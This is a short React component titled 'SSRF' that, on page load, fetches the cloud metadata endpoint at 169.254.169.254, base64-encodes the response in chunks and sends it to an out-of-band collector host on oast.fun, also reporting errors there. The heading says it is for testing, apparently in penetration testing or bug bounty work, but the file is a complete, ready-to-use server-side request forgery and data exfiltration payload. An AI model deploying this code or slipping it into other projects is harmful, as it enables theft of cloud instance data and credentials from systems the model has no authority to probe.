import React, { useEffect } from "react";

function Ssrf() {
  useEffect(() => {
    // Your controlled OOB server and target URL (modify as needed)
    const oobServer = "https://bjgibppjensgmxvguqwdtvjuqsby346yh.oast.fun";
    const targetUrl = "http://169.254.169.254/latest/meta-data/hostname";
    const timeoutDuration = 5000; // 5 seconds timeout

    // Function to split the data into chunks and exfiltrate each chunk
    const exfiltrateData = (data) => {
      const chunkSize = 1500;
      for (let i = 0; i < data.length; i += chunkSize) {
        const chunk = data.slice(i, i + chunkSize);
        const encodedChunk = btoa(chunk);
        // Send each chunk with its offset as an index
        fetch(`${oobServer}/?x=${i}_${encodedChunk}`);
      }
    };

    // Async function to fetch the URL and exfiltrate its response (or error message)
    async function fetchAndExfiltrate(url, timeoutDuration) {
      const controller = new AbortController();
      const signal = controller.signal;
      const timeoutId = setTimeout(() => controller.abort(), timeoutDuration);

      try {
        const response = await fetch(url, { signal });
        clearTimeout(timeoutId);
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
        const data = await response.text();
        exfiltrateData(data);
      } catch (error) {
        // If there's an error (including timeout), exfiltrate the error message
        fetch(`${oobServer}/?error=${btoa(error.message)}`);
      }
    }

    // Execute the function once when the component mounts
    fetchAndExfiltrate(targetUrl, timeoutDuration);
  }, []);

  return (
    <div>
      <div>
        <div>
          <h1>SSRF</h1>
          <h2>TSSRF for testing</h2>
        </div>
      </div>
    </div>
  );
}

export default Ssrf;
